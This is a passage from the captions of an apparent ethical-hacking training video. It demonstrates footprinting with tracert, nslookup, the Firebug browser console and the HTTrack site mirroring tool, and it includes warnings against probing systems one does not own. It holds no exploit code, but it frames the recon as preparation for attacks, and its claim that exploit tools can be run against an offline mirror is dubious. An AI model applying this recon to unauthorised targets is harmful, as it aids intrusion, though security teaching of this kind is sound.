may be.\n\n204\n00:10:22.670 --> 00:10:25.320\nNow, this may be a little bit of\na complicated way to do it, but\n\n205\n00:10:25.320 --> 00:10:30.280\nI can use something like traceroute as\na command to profile the machine, as well.\n\n206\n00:10:30.280 --> 00:10:32.000\nAnd I may be able to do\nsomething like that.\n\n207\n00:10:32.000 --> 00:10:34.700\nAnd there's different ways that\nI could do this, of course.\n\n208\n00:10:34.700 --> 00:10:37.130\nI could use the tracert\ncommand in Windows.\n\n209\n00:10:37.130 --> 00:10:38.860\nI can use a pathping.\n\n210\n00:10:38.860 --> 00:10:43.720\nAs well essentially to do the same thing,\nso if I want to do tracert www.cnn.com,\n\n211\n00:10:43.720 --> 00:10:50.430\nfind out where CNN is, gonna to\nlet that go out then do its thing.\n\n212\n00:10:50.430 --> 00:10:53.480\nWe'll give that a minute\nhere to kind of resolve and\n\n213\n00:10:53.480 --> 00:10:57.810\nwe're going to start to see some\ninformation and we're going to use tracert\n\n214\n00:10:57.810 --> 00:11:02.770\nto do a hop count hop by hop designation\non the path I take from where I\n\n215\n00:11:02.770 --> 00:11:07.720\nam sitting here in the IT Pro TV studios\ndeep underground hidden from view.\n\n216\n00:11:07.720 --> 00:11:08.420\n>> That's right.\n\n217\n00:11:08.420 --> 00:11:12.750\n>> Right all the way to Turner\nBroadcasting where we hit their firewall,\n\n218\n00:11:12.750 --> 00:11:17.140\nwhich is what that device is that you're\nseeing there when I hit the 129.250.\n\n219\n00:11:17.140 --> 00:11:19.360\nI'm timing out at a firewall or\n\n220\n00:11:19.360 --> 00:11:22.581\ngateway device before I actually\nget all the way back in, right.\n\n221\n00:11:22.581 --> 00:11:26.230\nAnd then times out then I ultimately\nget the webserver responding through\n\n222\n00:11:26.230 --> 00:11:27.072\nthere, right.\n\n223\n00:11:27.072 --> 00:11:33.040\nAnd so,you can see that I'm able to see\nthat I'm going from my IP on my machine\n\n224\n00:11:33.040 --> 00:11:38.930\nout to agru.net, right which I guess is\nthe carrier coming out of here, right?\n\n225\n00:11:38.930 --> 00:11:40.340\n>> Correct.\nNot the villain,\n\n226\n00:11:40.340 --> 00:11:43.215\nloveable villain though\nhe was in despicable me.\n\n227\n00:11:43.215 --> 00:11:44.840\n[LAUGH].\n>> And him and his minions,\n\n228\n00:11:44.840 --> 00:11:47.852\nbut then from gru then new horizons,\ngw, right?\n\n229\n00:11:47.852 --> 00:11:52.580\nGainsville.customer.agru.net, out to\ngig.gru.net, out to Juniper Right, so\n\n230\n00:11:52.580 --> 00:11:55.940\nwe're hitting the backbone on grw and\nthen we're going up, right.\n\n231\n00:11:55.940 --> 00:11:58.130\nSo, we're kind of walking through a path.\n\n232\n00:11:58.130 --> 00:12:02.670\nNow again, this in and of itself,\nright, would not necessarily give\n\n233\n00:12:02.670 --> 00:12:06.960\nus a lot of information by itself,\nbut as you pointed out, aggregating on\n\n234\n00:12:06.960 --> 00:12:10.510\nthese little chunks of information\nthat begin to start to be valuable.\n\n235\n00:12:10.510 --> 00:12:14.090\nSo, Ben asks would traceroute or\ntracert not be better for TTL?\n\n236\n00:12:14.090 --> 00:12:15.900\nBen, it very well could\nbe as I'm showing you and\n\n237\n00:12:15.900 --> 00:12:17.950\nit gives us a lot more information.\n\n238\n00:12:17.950 --> 00:12:21.450\nIt's just, again, just knowing that\nthere's different ways to use the base\n\n239\n00:12:21.450 --> 00:12:24.810\nping structure to manipulate\npackets is valuable.\n\n240\n00:12:24.810 --> 00:12:27.760\nBecause a lot of people just spend all\ntheir time and they're pinging, don't ever\n\n241\n00:12:27.760 --> 00:12:31.390\nthink about the fact that there's a bunch\nof switches that we potentially can use\n\n242\n00:12:31.390 --> 00:12:36.390\nwith ping to manipulate and\nto modify that request for information.\n\n243\n00:12:36.390 --> 00:12:39.470\nAnd as a result,\nmay actually be valuable for us be aware.\n\n244\n00:12:39.470 --> 00:12:41.890\nThat's really why I'm just taking\nthe trouble to show it to you,\n\n245\n00:12:41.890 --> 00:12:44.070\njust to give you a sense of that, right?\n\n246\n00:12:45.240 --> 00:12:49.380\nSo, it may be worthwhile for us to poke\naround in there, and to see what's going\n\n247\n00:12:49.380 --> 00:12:54.020\non by way of, again, doing a little recon\nand trying to find some information.\n\n248\n00:12:54.020 --> 00:12:56.270\nLet's take a look at\na slighty different approach.\n\n249\n00:12:56.270 --> 00:12:58.120\nLet's so, let me just gonna\nclear the screen here, so\n\n250\n00:12:58.120 --> 00:13:00.820\nwe can get rid of some of that,\nmake that go away.\n\n251\n00:13:00.820 --> 00:13:03.470\nLet's take a look at and\nI mentioned the NsLookup tool\n\n252\n00:13:03.470 --> 00:13:07.150\nwhen we were talking about it during\none of our earlier discussions.\n\n253\n00:13:07.150 --> 00:13:09.430\nI mentioned we would take\nlook at it at some point.\n\n254\n00:13:09.430 --> 00:13:13.570\nYou see I've loaded NsLookup just\nas a tool in the command line.\n\n255\n00:13:13.570 --> 00:13:14.540\nAnd all I've done is started.\n\n256\n00:13:14.540 --> 00:13:16.250\nAnd notice the prompt, by the way.\n\n257\n00:13:16.250 --> 00:13:18.100\nI'm now in the nslookup prompt.\n\n258\n00:13:18.100 --> 00:13:21.930\nI've loaded the program,\nin other words, and I'm using nslookup.\n\n259\n00:13:21.930 --> 00:13:26.700\nAnd now, what I can do is, I can go ahead\n\n260\n00:13:28.015 --> 00:13:32.925\nAnd I can do interactive or\nrather, excuse me.\n\n261\n00:13:32.925 --> 00:13:34.345\nNot interactive, try this again.\n\n262\n00:13:35.965 --> 00:13:39.515\nLet me go in and let me set,\nit's already interactive.\n\n263\n00:13:39.515 --> 00:13:41.250\nLet me set type.\n\n264\n00:13:41.250 --> 00:13:43.630\nEqual to, what do we wanna do?\n\n265\n00:13:43.630 --> 00:13:45.750\nWe wanna do a record there.\n\n266\n00:13:45.750 --> 00:13:48.650\nSo, if I set the type equal to a,\nI'm gonna set\n\n267\n00:13:48.650 --> 00:13:52.870\nthe configuration to do a query for\nIP addresses of a given domain, right.\n\n268\n00:13:52.870 --> 00:13:57.920\nSo, I'm gonna go look those up, and if I\nthen go and I get back some information,\n\n269\n00:13:57.920 --> 00:14:05.290\nso then I could go ahead and type in again\nsomething like www.cnn.com let's just say.\n\n270\n00:14:05.290 --> 00:14:07.900\nI'm going to get back information.\n\n271\n00:14:07.900 --> 00:14:10.920\nIt's going to show me a non authoritative\nanswer that shows me essentially what I\n\n272\n00:14:10.920 --> 00:14:12.050\nalready saw.\n\n273\n00:14:12.050 --> 00:14:14.710\nRight from the Ping\nwhere I ping CNN.com and\n\n274\n00:14:14.710 --> 00:14:18.470\nI did the resolution, it showed me it\nwas resolving to turner.map that fast.\n\n275\n00:14:18.470 --> 00:14:21.620\nThat's not new, and\nit showed me the IP address, so\n\n276\n00:14:21.620 --> 00:14:23.420\nI mean I got that information ready.\n\n277\n00:14:23.420 --> 00:14:26.605\nThis is just helping me to validate that\nto make sure that it really is that.\n\n278\n00:14:26.605 --> 00:14:29.480\nBut I'm seeing and\nessentially I'm understanding it.\n\n279\n00:14:29.480 --> 00:14:33.480\nBut then this look up allows me\nto get a variety of information\n\n280\n00:14:33.480 --> 00:14:34.570\ndepending on what I'm doing.\n\n281\n00:14:34.570 --> 00:14:39.260\nNow, if I set the record type equal to\n\n282\n00:14:39.260 --> 00:14:44.220\ninstead of a equal to let's say c name,\nright?\n\n283\n00:14:44.220 --> 00:14:46.840\nCNAME is a record type that\nallows us to create and\n\n284\n00:14:46.840 --> 00:14:50.300\nuse what are called canonical name\nrecords they're alias records.\n\n285\n00:14:50.300 --> 00:14:54.660\nNow, alias records may be very valuable,\nvery important for the hacker or the CEH,\n\n286\n00:14:54.660 --> 00:14:59.710\nthe Certified Ethical Hacker, to be aware\nof because they will give us mappings to\n\n287\n00:14:59.710 --> 00:15:03.760\nsystems that are referred to by different\nnames, and tell us that they exist.\n\n288\n00:15:03.760 --> 00:15:09.520\nNow, there may not be any CNAMEs that I\nwon’t be able to reference at CNN.com.\n\n289\n00:15:09.520 --> 00:15:12.931\nIt’s very likely that I’ll probably get\nthose, but let’s try this one, right?\n\n290\n00:15:12.931 --> 00:15:13.929\nLet’s try this one.\n\n291\n00:15:13.929 --> 00:15:20.250\nWww this one right here.\n\n292\n00:15:21.320 --> 00:15:23.785\nAnd when I do this one, right,\n\n293\n00:15:23.785 --> 00:15:27.770\ncertifiedhacker.com the canonical\nname is certifiedhacker.com, right?\n\n294\n00:15:27.770 --> 00:15:30.870\nThis is just one of the websites that,\nthese accounts you have out there that\n\n295\n00:15:30.870 --> 00:15:35.140\nsays, hey, you can go to and take a look\nat and play around with sometimes, right?\n\n296\n00:15:35.140 --> 00:15:40.710\nAnd so, yeah, you can go out and find what\nthe connotical name or alias name is.\n\n297\n00:15:40.710 --> 00:15:44.250\nI may be able to go out if there\nis one out there and do CNN.\n\n298\n00:15:44.250 --> 00:15:46.070\nI don't know if there is.\n\n299\n00:15:46.070 --> 00:15:47.980\nBut if there is anything out there.\n\n300\n00:15:47.980 --> 00:15:51.710\nYou'll see the canonical names\nturner.map.fastly.net for cnn.com.\n\n301\n00:15:51.710 --> 00:15:52.849\nThat's what it resolves to.\n\n302\n00:15:52.849 --> 00:15:54.495\nSo I can find these, right.\n\n303\n00:15:54.495 --> 00:15:56.575\nAnd I can be able to get them.\n\n304\n00:15:56.575 --> 00:16:00.466\nAnd again, this may give me information\nNot about this particular site,\n\n305\n00:16:00.466 --> 00:16:04.921\nbut rather, it will give me information,\nor rather, about this particular site,\n\n306\n00:16:04.921 --> 00:16:08.684\nit gives me a way to find additional\ninformation that I may not get just by\n\n307\n00:16:08.684 --> 00:16:13.139\nlooking at the Whois registration, because\nI may not be able to get that information\n\n308\n00:16:13.139 --> 00:16:17.280\nright directly from the Whois site, but\nI may be able to get it from nslookup.\n\n309\n00:16:17.280 --> 00:16:21.380\nAgain, we haven't done anything like do a\nzone transfer yet, we haven't gotten that.\n\n310\n00:16:21.380 --> 00:16:26.570\nAll we're doing is just looking at ways we\ncan use nslookup to provide information\n\n311\n00:16:26.570 --> 00:16:27.290\nand to understand.\n\n312\n00:16:27.290 --> 00:16:30.680\nNow, there may be, as I said, other things\nwe can do here where we can try to do\n\n313\n00:16:30.680 --> 00:16:35.290\na zone transfer, forcibly gathering that\nzone information from another machine.\n\n314\n00:16:35.290 --> 00:16:38.490\nNot going to demonstrate that\nparticular methodology for\n\n315\n00:16:38.490 --> 00:16:42.050\nyou because that verges into the, hey,\nwe're doing blackhat hacking, that stuff\n\n316\n00:16:42.050 --> 00:16:47.000\nthat, it was actually dark art magic that\nyou can use for evil as well as for good.\n\n317\n00:16:47.000 --> 00:16:51.200\nBit it's not hard to figure out what you\nwould do if you think about setting record\n\n318\n00:16:51.200 --> 00:16:55.470\ntypes in a nslookup and perhaps setting\nthat system to be authoritative and\n\n319\n00:16:55.470 --> 00:16:57.110\ntry to request a zone transfer.\n\n320\n00:16:57.110 --> 00:17:01.120\nIf you understand how nslookup works, it\nwouldn't be a very big leap of faith for\n\n321\n00:17:01.120 --> 00:17:04.160\nyou to figure out how\nyou may execute on that.\n\n322\n00:17:04.160 --> 00:17:06.710\nBut that would be something\nelse that you could do here and\n\n323\n00:17:06.710 --> 00:17:09.550\npotentially may actually prove\nto be interesting for you.\n\n324\n00:17:09.550 --> 00:17:14.000\nI would strongly caution you that if\nyou want to play with that aspect,\n\n325\n00:17:14.000 --> 00:17:17.260\nthat you do it against your\nDNS infrastructure internally.\n\n326\n00:17:17.260 --> 00:17:20.490\nYou don't try to do this to an external\nsystem that's running live that you\n\n327\n00:17:20.490 --> 00:17:24.360\ndon't own,\nthat is considered hacking by the way.\n\n328\n00:17:24.360 --> 00:17:26.800\nSo you just wanna make sure\nyou are aware of that you're\n\n329\n00:17:26.800 --> 00:17:30.490\nrequesting under false pretenses that you\nget information you're not entitled to.\n\n330\n00:17:30.490 --> 00:17:33.090\nAnd although you may not do\nanything illegal with it,\n\n331\n00:17:33.090 --> 00:17:36.665\nthat is borderline unethical and\nborderline hacking.\n\n332\n00:17:36.665 --> 00:17:37.470\n>> Mm-hm.\n\n333\n00:17:37.470 --> 00:17:41.140\n>> It's not quite crossing the line but\nyou're walking on that fine line, and\n\n334\n00:17:41.140 --> 00:17:42.620\nwe don't encourage that kind of behavior.\n\n335\n00:17:42.620 --> 00:17:45.150\n>> That organization might have\nquestions and/or your ISP,\n\n336\n00:17:45.150 --> 00:17:47.843\nwho can see that traffic might\nhave questions for you as well.\n\n337\n00:17:47.843 --> 00:17:49.300\n[LAUGH]\n>> Yeah, that might would be a definite,\n\n338\n00:17:49.300 --> 00:17:50.610\nlet's just be clear about that.\n\n339\n00:17:50.610 --> 00:17:53.470\nSo you wanna make sure you're comfortable\nabout that and understand that.\n\n340\n00:17:53.470 --> 00:17:55.562\nSo let's also come back over here, hello.\n\n341\n00:17:55.562 --> 00:17:56.810\n[LAUGH]\n>> [LAUGH] All right so\n\n342\n00:17:56.810 --> 00:17:59.910\nI'm standing off to the side when I'm\ndoing the lab demo as you can see, and\n\n343\n00:17:59.910 --> 00:18:01.010\nI'm kinda off center.\n\n344\n00:18:01.010 --> 00:18:03.240\nSo let's go back, and\nlet's do something else.\n\n345\n00:18:03.240 --> 00:18:05.550\nI wanna show you another set of\ntools that you may wanna look at.\n\n346\n00:18:05.550 --> 00:18:07.220\nDifferent way of doing a little recon,\n\n347\n00:18:07.220 --> 00:18:10.900\na different way of doing some\nfingerprinting, excuse me.\n\n348\n00:18:10.900 --> 00:18:15.790\nI've got Firefox opened up on\nthe desktop here, the Mozilla browser,\n\n349\n00:18:15.790 --> 00:18:17.110\nif you're not familiar with it.\n\n350\n00:18:17.110 --> 00:18:18.770\nThe three biggies or four biggies,\n\n351\n00:18:18.770 --> 00:18:23.330\ncertainly IE, you've got Mozilla's\nFirefox, you've got Google's Chrome, and\n\n352\n00:18:23.330 --> 00:18:26.650\nyou certainly have Safari,\nwhich is the Apple browser.\n\n353\n00:18:26.650 --> 00:18:28.730\nThere many others out there, but\n\n354\n00:18:28.730 --> 00:18:31.180\nthese are some of the bigger\nones that you could look at.\n\n355\n00:18:31.180 --> 00:18:34.840\nFirefox is interesting because\nthey have a plugin called Firebug,\n\n356\n00:18:34.840 --> 00:18:39.215\nwhich allows us to go out and o some\nrecord and probing of code on websites.\n\n357\n00:18:39.215 --> 00:18:43.694\nThe developer console in IE will show\nus very similar content, F12 in IE.\n\n358\n00:18:43.694 --> 00:18:46.530\n>> F12, yeah.\nYou may have seen that the debug slash\n\n359\n00:18:46.530 --> 00:18:50.230\ndeveloper console is another way to do\nmore or less what I'm about to show you.\n\n360\n00:18:50.230 --> 00:18:53.500\nMost of the browsers have\na function like this.\n\n361\n00:18:53.500 --> 00:18:56.830\nFirefox use it as a plug-in, so\nyou have to go out and download and\n\n362\n00:18:56.830 --> 00:18:58.210\nenable the Fire Bug Plug-In.\n\n363\n00:18:58.210 --> 00:19:01.650\nWe could certainly post that for\nyou in terms of the URL.\n\n364\n00:19:01.650 --> 00:19:06.270\nBut you can go in and once you have\ndone that, once you've gone in and\n\n365\n00:19:06.270 --> 00:19:10.390\nactually downloaded the plug-in,\nyou could then go ahead and turn it on.\n\n366\n00:19:10.390 --> 00:19:12.300\nI have it already set up up here.\n\n367\n00:19:12.300 --> 00:19:15.990\nYou'll see right here,\nI have the Firebug item already set up.\n\n368\n00:19:15.990 --> 00:19:20.430\nIt's deactivated right now, I'm gonna\nturn it on, so I'm gonna click on it.\n\n369\n00:19:20.430 --> 00:19:24.365\nAnd then, you'll see when I do that it\ngoes live, the little bug icon lights up.\n\n370\n00:19:24.365 --> 00:19:27.080\n>> Mm-hm\n>> And then, I can go in and\n\n371\n00:19:27.080 --> 00:19:29.190\nI can take a look at a variety\nof different things.\n\n372\n00:19:29.190 --> 00:19:33.540\nYou can see it down here in the bottom,\nI've got the little console that opens up.\n\n373\n00:19:33.540 --> 00:19:35.040\nAnd yes, perfect, thank you very much.\n\n374\n00:19:35.040 --> 00:19:35.780\nOr if you're in the browser,\n\n375\n00:19:35.780 --> 00:19:39.230\nyou can just go to the add ons area, and\njust directly grab it right from there.\n\n376\n00:19:39.230 --> 00:19:42.840\nAnd just click add on, get, and it'll just\ngo out and grab it and install it for you.\n\n377\n00:19:42.840 --> 00:19:44.860\nYou just have to activate\nit when you wanna use it.\n\n378\n00:19:44.860 --> 00:19:48.270\nAnd what we can see here, essentially,\nis the ability to be able to go in.\n\n379\n00:19:49.280 --> 00:19:53.450\nSo look at the underlying code, and\nonce you've installed and activated it,\n\n380\n00:19:53.450 --> 00:19:57.490\nyou then can go in and you can grab\nwhatever website you wanna target.\n\n381\n00:19:57.490 --> 00:20:04.910\nSo let's just say I wanna go out here and,\nlet's go to www.eccouncil.org.\n\n382\n00:20:04.910 --> 00:20:07.490\nAll right, we can look at their website,\npull it up and\n\n383\n00:20:07.490 --> 00:20:11.150\nthen in the console at the bottom,\nit's actually gonna expose the website and\n\n384\n00:20:11.150 --> 00:20:13.070\nshow us some information, right.\n\n385\n00:20:13.070 --> 00:20:16.760\nSo if there's cookies allowed,\nwe can see the cookies that are there and\n\n386\n00:20:16.760 --> 00:20:18.590\nit'll profile the cookies for us.\n\n387\n00:20:18.590 --> 00:20:21.285\nLets just open them up and\nsee what they are, evil cookies, right?\n\n388\n00:20:21.285 --> 00:20:22.620\n>> [LAUGH]\n>> You don't like cookies?\n\n389\n00:20:22.620 --> 00:20:25.750\nSo we can see the domains\nthe cookies are associated with.\n\n390\n00:20:25.750 --> 00:20:28.320\nThat information may or\nmay not be helpful to a hacker, but\n\n391\n00:20:28.320 --> 00:20:32.850\nit will tell us what the domains\nare inside, so that would be good to know.\n\n392\n00:20:32.850 --> 00:20:38.505\nWe also can see, as we open up some\nadditional information about them,\n\n393\n00:20:38.505 --> 00:20:40.945\nnothing that's very\nproblematic to give away.\n\n394\n00:20:40.945 --> 00:20:43.685\nThey're just showing us what the values\nare of the individual cookies, but\n\n395\n00:20:43.685 --> 00:20:46.495\nif they do expire they show\nus when they expire so\n\n396\n00:20:46.495 --> 00:20:49.165\nwe can see information about\nsome summer session only.\n\n397\n00:20:49.165 --> 00:20:53.490\nSummer resident will expire, like this\none here expires on June 14, 2018.\n\n398\n00:20:53.490 --> 00:20:57.150\nSo it shows me what\ncookies are being used,\n\n399\n00:20:57.150 --> 00:20:59.990\nwhat's being implemented in my system,\nhow long it's there for.\n\n400\n00:20:59.990 --> 00:21:03.670\nSo it helps me track potentially\nthis kind of information.\n\n401\n00:21:03.670 --> 00:21:08.480\nI can take a look at the net tab and\nI can see here, just scroll down.\n\n402\n00:21:08.480 --> 00:21:11.150\nI can see information\nabout the get request\n\n403\n00:21:11.150 --> 00:21:14.610\nthat are being issued to pull content in,\nhow long they're taking.\n\n404\n00:21:14.610 --> 00:21:17.400\nSo from a performance standpoint,\nI could see the information,\n\n405\n00:21:17.400 --> 00:21:20.820\nthe amount of data that's transiting,\nwhich is actually kinda cool.\n\n406\n00:21:20.820 --> 00:21:24.240\nAgain from a performance standpoint\nslash developer debug standpoint,\n\n407\n00:21:24.240 --> 00:21:28.320\nit's kind of what some of this is, if you\npair this against the developer console\n\n408\n00:21:28.320 --> 00:21:32.378\nin IE, as I said, the F12 console,\nyou would see this information there.\n\n409\n00:21:32.378 --> 00:21:37.250\nDom, if there's information about\nthe Windows Direct Object Model here,\n\n410\n00:21:37.250 --> 00:21:40.840\nwe could see information about any of\nthese objects and how they're declared.\n\n411\n00:21:40.840 --> 00:21:44.330\nAgain, looking for information in\nthe code, and/or, potentially,\n\n412\n00:21:44.330 --> 00:21:48.030\ntell tale signs in the script\nabout things that are going on.\n\n413\n00:21:48.030 --> 00:21:50.300\nMaybe if this is a web site\nI'm looking for weaknesses on,\n\n414\n00:21:50.300 --> 00:21:53.250\nI may look for potential weaknesses\nthat I could profile and\n\n415\n00:21:53.250 --> 00:21:57.280\nsay, look, there's an ActiveX control,\nthere's a Java control,\n\n416\n00:21:57.280 --> 00:22:00.050\nmaybe I can use that to my advantage,\nand I would go look for that.\n\n417\n00:22:00.050 --> 00:22:03.330\nSo angle through and look for\nall sorts of stuff in here.\n\n418\n00:22:03.330 --> 00:22:04.820\nI could see some script in here and\n\n419\n00:22:04.820 --> 00:22:08.360\nsee what kind of information,\nmaybe, put out on the script area.\n\n420\n00:22:08.360 --> 00:22:11.590\nThis is jQuery,\nthis is a JavaScript or a javaQuery.\n\n421\n00:22:11.590 --> 00:22:15.730\nI could see CSS underlying codes if\nthere's any rules in here for CSS.\n\n422\n00:22:15.730 --> 00:22:18.630\nI can look at the html code itself,\nlooking for\n\n423\n00:22:18.630 --> 00:22:22.660\nwhat version of XHTML and HTML,\nthe code base may be built on.\n\n424\n00:22:22.660 --> 00:22:26.240\nAgain, it may tell us old, new, good,\nbad, do I have weaknesses there.\n\n425\n00:22:26.240 --> 00:22:29.780\nSo I can profile any system by using this,\nand again,\n\n426\n00:22:29.780 --> 00:22:34.860\nthis is not in and of itself,\ngonna give me a lot of information per se.\n\n427\n00:22:34.860 --> 00:22:38.130\nBut it's going to allow me to\ndelve a little deeper, look for\n\n428\n00:22:38.130 --> 00:22:42.850\nadditional information that could be\nhelpful or valuable, and I would put this\n\n429\n00:22:42.850 --> 00:22:46.930\nout there with additional pieces that may\nbe valuable for me to aggregate and find.\n\n430\n00:22:46.930 --> 00:22:50.450\n>> Absolutely, and sometimes you\nfind that coders maybe aren't as,\n\n431\n00:22:50.450 --> 00:22:51.930\nwhat's the word you use, proficient-\n>> Smart?\n\n432\n00:22:51.930 --> 00:22:52.680\n>> Or smart, yeah.\n\n433\n00:22:52.680 --> 00:22:54.330\n[LAUGH]\n>> No, I don't wanna say that.\n\n434\n00:22:54.330 --> 00:22:55.500\nThat's not true.\n\n435\n00:22:55.500 --> 00:22:59.680\n>> And they expose more information\nthan maybe they wanted to in that code.\n\n436\n00:22:59.680 --> 00:23:03.120\nYou can start seeing links of\nwhere it's pulling images from or\n\n437\n00:23:03.120 --> 00:23:06.450\nstart breaking down that\ndirectory on that web server,\n\n438\n00:23:06.450 --> 00:23:08.820\nfigure out where the scripts are allowed\nto run and things like that.\n\n439\n00:23:08.820 --> 00:23:11.240\nSo there's a lot of valuable\ninformation between from there.\n\n440\n00:23:11.240 --> 00:23:13.250\n>> There is, we actually,\nwe talk about that.\n\n441\n00:23:13.250 --> 00:23:16.420\nAnd we'll circle back to that\nexact concept might just describe.\n\n442\n00:23:16.420 --> 00:23:19.030\nAt some point later,\nwhen we talk about hacking websites and\n\n443\n00:23:19.030 --> 00:23:24.010\nwe talk about weaknesses and all lost and\nthe top ten web application security\n\n444\n00:23:24.010 --> 00:23:27.740\nvulnerabilities list,\nthe 2013 version of that list.\n\n445\n00:23:27.740 --> 00:23:29.080\nThe 2016 version is actually up for\nreview.\n\n446\n00:23:29.080 --> 00:23:30.710\nYou and I,\nwe talked about it from time to time.\n\n447\n00:23:30.710 --> 00:23:32.980\nThey just opened the comment period,\nit ends in like three weeks.\n\n448\n00:23:32.980 --> 00:23:34.740\n>> Nice.\n>> So they're gonna have that out in\n\n449\n00:23:34.740 --> 00:23:36.450\nthe beginning of 2017.\n\n450\n00:23:36.450 --> 00:23:40.690\nBut one of the specific weaknesses on that\ntop ten list is what Mike just described,\n\n451\n00:23:40.690 --> 00:23:44.720\nwhich is embedded links and\nhard coding links inside the code, so\n\n452\n00:23:44.720 --> 00:23:48.460\nthat we see a path as opposed to\na variable that can be substituted.\n\n453\n00:23:48.460 --> 00:23:51.800\nSo we know that the path to\nthat statement or the path for\n\n454\n00:23:51.800 --> 00:23:54.860\nthat statement execute\nis C:\\inetpub\\wwwroot.\n\n455\n00:23:54.860 --> 00:23:56.150\nGuess what?\n\n456\n00:23:56.150 --> 00:23:58.679\nI now know that's a Microsoft\nweb server running.\n\n457\n00:23:58.679 --> 00:24:01.297\nAnd from a footprinting or\nrecon perspective,\n\n458\n00:24:01.297 --> 00:24:04.511\nthat is huge because that just\nnarrowed my guessing game.\n\n459\n00:24:04.511 --> 00:24:08.735\nOn the type of vulnerabilities that\nsystem maybe potentially vulnerable to,\n\n460\n00:24:08.735 --> 00:24:12.180\nby 50% cuz now I know it's Microsoft,\nit's not Linux.\n\n461\n00:24:12.180 --> 00:24:15.820\nAnd I know IIS and I could probably\ntell what version based on that path.\n\n462\n00:24:15.820 --> 00:24:19.630\nAnd as a result, I now have narrowed\nit even further because now I go out to\n\n463\n00:24:19.630 --> 00:24:24.520\nthe dark web and I go do a little search\non the hacking databases and I can find as\n\n464\n00:24:24.520 --> 00:24:29.510\na result what weaknesses that particular\nbuild of IIS is probably vulnerable to.\n\n465\n00:24:29.510 --> 00:24:33.410\nAnd I now have five or ten ready-made\nexploits that I can go execute\n\n466\n00:24:33.410 --> 00:24:35.580\nto try to probe that web browser or,\nexcuse me,\n\n467\n00:24:35.580 --> 00:24:38.760\nthrough the web browser probe that\nweb server to try to take it on.\n\n468\n00:24:38.760 --> 00:24:43.150\nSo embedded links are just a big huge,\nhuge problem.\n\n469\n00:24:43.150 --> 00:24:45.200\nAnd tools like Firebug expose that for us.\n\n470\n00:24:45.200 --> 00:24:46.680\nSo that's going to be very valuable,\nright?\n\n471\n00:24:46.680 --> 00:24:49.519\nSo, I just want to make\nsure we're aware of that.\n\n472\n00:24:49.519 --> 00:24:50.842\nCan we go as I walk off camera?\n\n473\n00:24:50.842 --> 00:24:53.623\n>> [LAUGH]\n>> Sorry, woo.\n\n474\n00:24:53.623 --> 00:24:55.300\nCan we go back to our, there we go.\n\n475\n00:24:55.300 --> 00:24:56.350\nSee, now you don't see me.\n\n476\n00:24:56.350 --> 00:24:57.220\nI can be standing all the way.\n\n477\n00:24:57.220 --> 00:24:59.020\nAs a matter of fact,\nI'm standing next to Megan right now.\n\n478\n00:24:59.020 --> 00:25:00.455\nYou don't even know that,\nbecause I'm across the room.\n\n479\n00:25:00.455 --> 00:25:01.760\n>> [LAUGH]\n>> So let's go back and\n\n480\n00:25:01.760 --> 00:25:04.170\ntake a look at another\ntool that's in here,\n\n481\n00:25:04.170 --> 00:25:08.830\nanother really cool tool called HTTrack,\nwanna take a look at this one.\n\n482\n00:25:08.830 --> 00:25:12.980\nThis is gonna allow us to mirror a\nwebsite, pull it down, essentially vacuum\n\n483\n00:25:12.980 --> 00:25:16.825\nit down, mirror it, and then allow us\nto edit it and look at it offline.\n\n484\n00:25:16.825 --> 00:25:19.155\nSo this is one of many tools\nthat exists out there.\n\n485\n00:25:19.155 --> 00:25:22.605\nNow I took this tool, you can download\nthis, it's called Website Copier.\n\n486\n00:25:22.605 --> 00:25:23.685\nIt's a free tool.\n\n487\n00:25:23.685 --> 00:25:27.725\nI already ran it against cnn.com\nbecause that's a massive web site.\n\n488\n00:25:27.725 --> 00:25:30.831\nI ran it for about three hours last night,\nsucked down about a gig and\n\n489\n00:25:30.831 --> 00:25:31.548\na half of data.\n\n490\n00:25:31.548 --> 00:25:35.054\nAnd I only got a 112 links into 6000.\n\n491\n00:25:35.054 --> 00:25:35.773\n>> Holy smokes.\n\n492\n00:25:35.773 --> 00:25:40.767\n>> So, sometimes being able to run this\nagainst a full site could take days,\n\n493\n00:25:40.767 --> 00:25:42.750\nweeks, to fully mirror.\n\n494\n00:25:42.750 --> 00:25:45.410\nBut once I mirror that site,\nI've got everything on there and I've got\n\n495\n00:25:45.410 --> 00:25:49.900\nan archive copy locally that I can then go\nin and at my leisure run attack scripts\n\n496\n00:25:49.900 --> 00:25:54.110\nagainst, I can run vulnerability scanners\nagainst, I can run Metasploit against.\n\n497\n00:25:54.110 --> 00:25:56.810\nI can find the weaknesses,\nmake sure I know what they are,\n\n498\n00:25:56.810 --> 00:25:59.752\nand then I just go out and\ncraft my attacks and boom.\n\n499\n00:25:59.752 --> 00:26:01.790\nIn real-time I take you\nout in five minutes,\n\n500\n00:26:01.790 --> 00:26:04.670\nno problem cuz I do all\nthe background work offline.\n\n501\n00:26:04.670 --> 00:26:09.370\nSo a tool like this can be, again, very\npowerful with regards to be able to go in,\n\n502\n00:26:09.370 --> 00:26:12.410\nand do recon, and fingerprinting,\nand footprinting, right?\n\n503\n00:26:12.410 --> 00:26:13.920\nSo I've loaded this tool.\n\n504\n00:26:13.920 --> 00:26:17.318\nAgain, will tell you where do find it,\nif we don't already have it, no big deal.\n\n505\n00:26:17.318 --> 00:26:21.488\nIt's called HTT or HTTrack, rather.\n\n506\n00:26:21.488 --> 00:26:22.663\nExcuse me, HTTrack.\n\n507\n00:26:22.663 --> 00:26:24.350\nIt's called the website copier.\n\n508\n00:26:24.350 --> 00:26:25.860\nSo, it's just a very simple interface.\n\n509\n00:26:25.860 --> 00:26:27.110\nI've already loaded the program.\n\n510\n00:26:27.110 --> 00:26:28.180\nI've already installed it.\n\n511\n00:26:28.180 --> 00:26:29.360\nThat's just Next, Next, Next.\n\n512\n00:26:29.360 --> 00:26:30.610\nNo big deal there.\n\n513\n00:26:30.610 --> 00:26:33.800\nI'm going to hit Next here because\nI've already done a project.\n\n514\n00:26:33.800 --> 00:26:36.440\nSo what I wanna do is pull\ndown the project I have.\n\n515\n00:26:36.440 --> 00:26:38.050\nI've done WebMirrorCNN.com.\n\n516\n00:26:38.050 --> 00:26:40.110\nSo I'm just gonna go WebMirrorCNN.\n\n517\n00:26:40.110 --> 00:26:41.310\nI've already named it.\n\n518\n00:26:41.310 --> 00:26:45.734\nAnd you can see over here I have the\nWebMirrorCNN folder that's gonna have all\n\n519\n00:26:45.734 --> 00:26:47.583\nthe information in it, right?\n\n520\n00:26:47.583 --> 00:26:49.950\nSo I'm gonna hit Next,\nit's gonna ask me what I wanna do.\n\n521\n00:26:49.950 --> 00:26:53.600\nDo I wanna continue the interrupted\ndownload, do I 